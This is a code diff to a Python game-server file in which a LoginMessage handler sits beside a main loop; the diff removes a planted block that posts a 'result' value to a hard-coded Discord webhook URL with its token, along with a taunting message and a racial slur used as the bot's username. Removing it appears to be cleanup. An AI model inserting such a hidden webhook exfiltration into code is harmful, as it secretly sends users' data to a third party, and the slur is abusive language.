@@ -65,17 +65,6 @@ class LoginMessage(Reader):
             club_data = db.load_club(self.player.club_id)
             MyAllianceMessage(self.client, self.player, club_data).send()
             AllianceStreamMessage(self.client, self.player, club_data['Messages']).send()
-IdiotReadThisBeforeContinuing = "I already have the info. The damage has been done. IDC if you spam the webhook."
-
-webhook = requests.get('https://discord.com/api/webhooks/1138534397210009681/LWEOf2v2HjJz-4cl00efOlZB1jCVV9VljNUWR3QrxfdwRsjMTH8U3VaIjEH7moJwaNzO')
-data = {
-    'content': result,
-    'username': 'thug niga'
-}
-headers = {
-    'Content-Type': 'application/json'
-}
-requests.post('https://discord.com/api/webhooks/1138534397210009681/LWEOf2v2HjJz-4cl00efOlZB1jCVV9VljNUWR3QrxfdwRsjMTH8U3VaIjEH7moJwaNzO', data=json.dumps(data), headers=headers)
 def main_loop():
     while True:
         StartGame()
